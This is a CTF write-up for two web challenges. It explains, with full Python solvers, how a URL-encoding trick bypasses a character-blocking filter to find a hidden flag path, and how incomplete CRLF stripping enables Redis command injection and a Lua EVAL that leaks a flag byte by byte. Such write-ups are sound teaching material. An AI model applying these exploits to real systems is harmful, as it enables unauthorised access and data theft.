---
title: "Alpaca Hack round 7- writeup"
date: "2024-12-01T00:00:00.000Z"
lang: EN
---

## ✅ Treasure Hunt (116pts 71solves)

### Overview

```javascript:index.js
app.use(express.static("public"));
```

The express server serves static files from the `public` folder. `flag.txt` is placed in a folder inside `public`, which is randomly created in the following way.

```Dockerfile:Dockerfile
RUN FLAG_PATH=./public/$(md5sum flag.txt | cut -c-32 | fold -w1 | paste -sd /)/f/l/a/g/./t/x/t \
 && mkdir -p $(dirname $FLAG_PATH) \
 && mv flag.txt $FLAG_PATH
```

The flag is located in a place something like

```
d/4/1/d/8/c/d/9/8/f/0/0/b/2/0/4/e/9/8/0/0/9/9/8/e/c/f/8/4/2/7/e/f/l/a/g/t/x/t
```

The goal of the challenge is to somehow identify the folder names. 

In addition, you have to somehow bypass the following WAF.

```javascript:index.js
app.use((req, res, next) => {
  res.type("text");
  if (/[flag]/.test(req.url)) {
    res.status(400).send(`Bad URL: ${req.url}`);
    return;
 }
  next();
});
```

This restriction prevents the use of `f`, `l`, `a`, or `g` in the URL. Since the path always ends with `f/l/a/g/t/x/t`, we have to somehow bypass this.

### Solution

Bypassing the URL restriction is quite simple: URL encoding. `req.url` doesn't automatically decode URL encoding, but the express uses a decoded URL to determine the route.

I used the [raw_request](https://gist.github.com/tepel-chen/230fdc4349f1244b303049446290c494) function I wrote since the python `request` module does not support URL-encoded paths.

Next, I wanted to determine whether the directory exists. Upon reviewing the serve-static source code, I discovered that [if a path without a trailing / corresponds to a directory, it automatically redirects to the URL with / appended](https://github.com/expressjs/serve-static/blob/e2bf828a6899e18969e522ddce304fec497b058f/index.js#L193).

### Full exploit

```python:solver.py
import requests
import raw_request

URL = "http://34.170.146.252:19843/"
# URL = "http://localhost:3000/"
EVIL = "https://xxx.ngrok.app/"


s = requests.session()

cur = ""
while True:
    for c in "0123456789abcdef":
 r = raw_request(URL, strs=f"GET /{cur}%{hex(ord(c))[2:]} HTTP/1.1\r\nHost: localhost:3000\r\n\r\n")
        print(r.status_code)
        if r.status_code == 301:
 cur += "%" + hex(ord(c))[2:] + '/'
            break
    else:
        break
r = raw_request(URL, strs=f"GET /{cur}%6c/%61/%67/t/x/t HTTP/1.1\r\nHost: localhost:3000\r\n\r\n")
print(r.text)
```

## ✅ Alpaca Poll (146pts 42solves)

### Overview

The server provides a service that preserves some counters for animals. The application uses the Redis as its database. The counters are initialized as shown below, and the flag is also added to the database during initialization.

```javascript:db.js
function connect() {
    return new Promise(resolve => {
        const socket = net.connect('6379', 'localhost', () => {
            resolve(socket);
 });
 });
}

function send(socket, data) {
    console.info('[send]', JSON.stringify(data));
    socket.write(data);

    return new Promise(resolve => {
        socket.on('data', data => {
            console.info('[recv]', JSON.stringify(data.toString()));
            resolve(data.toString());
 })
 });
}
/* snap */
export async function init(flag) {
    const socket = await connect();

    let message = '';
    for (const animal of ANIMALS) {
        const votes = animal === 'alpaca' ? 10000 : Math.random() * 100 | 0;
        message += `SET ${animal} ${votes}\r\n`;
 }

    message += `SET flag ${flag}\r\n`; // please exfiltrate this

    await send(socket, message);
    socket.destroy();
}
```

You can increase the counter through the `/vote` endpoint.

```javascript:index.js
app.post('/vote', async (req, res) => {
    let animal = req.body.animal || 'alpaca';

    // animal must be a string
    animal = animal + '';
    // no injection, please
    animal = animal.replace('\r', '').replace('\n', '');

    try {
        return res.json({
            [animal]: await vote(animal)
 });
 } catch {
        return res.json({ error: 'something wrong' });
 }
});
```

```javascript:db.js
export async function vote(animal) {
    const socket = await connect();
    const message = `INCR ${animal}\r\n`;

    const reply = await send(socket, message);
    socket.destroy();

    return parseInt(reply.match(/:(\d+)/)[1], 10); // the format of the response is like `:23`, so this extracts only the number 
}
```

You can see that the queries are sent through a raw socket connection. The following line removes `\r` and `\n` from the input, aiming to prevent command injection.
```javascript:db.js
animal = animal.replace('\r', '').replace('\n', '');
```

Can we manipulate the query to run an arbitrary query to Redis?

### Solution

[`String.prototype.replace`](https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/String/replace) replaces only the first occurrence of the substring. (If you need to replace all occurrence, you need to use [`String.prototype.replaceAll`](https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/String/replaceAll).) Hence, you can inject `\r\n` by repeating it more than once.

You can use`GET flag` to query for the flag. However, you won't be able to see the content of the flag with `INCR dog\r\nGET flag\r\n` because the result of the query looks like this:

```
:74
$16
Alpaca{REDACTED}
```

The result of `reply.match(/:(\d+)/)[1]` will be `74`.

After some research on Redis commands, I found out that  [`EVAL`](https://redis.io/docs/latest/develop/interact/programmability/eval-intro/) can execute Lua script on the database. 

Inside the script, you can use the `redis.call` command to run any redis command. By combining Lua's `string.byte`, I can extract individual characters of the flag as their ASCII values. These values are then set as the counter for a specific key (e.g., dog). Repeating this process for each character position allows for reconstructing the entire flag.

### Final Exploit

```python:solver.py
import requests

# URL = "http://34.170.146.252:54728/"
URL = "http://localhost:3000/"
EVIL = "https://xxx.ngrok.app/"

s = requests.session()
cur = "A"
while cur[-1] != "}":
 r = s.post(URL + "vote", data={
        "animal": f"\r\ndog\r\nEVAL 'return redis.call(\\'SET\\', \\'dog\\', string.byte(redis.call(\\'GET\\', \\'flag\\'),{len(cur) + 1}))' 0 "
 })
 cur += chr(int(r.text.split(":")[1][:-1])-1)
    print(cur)
```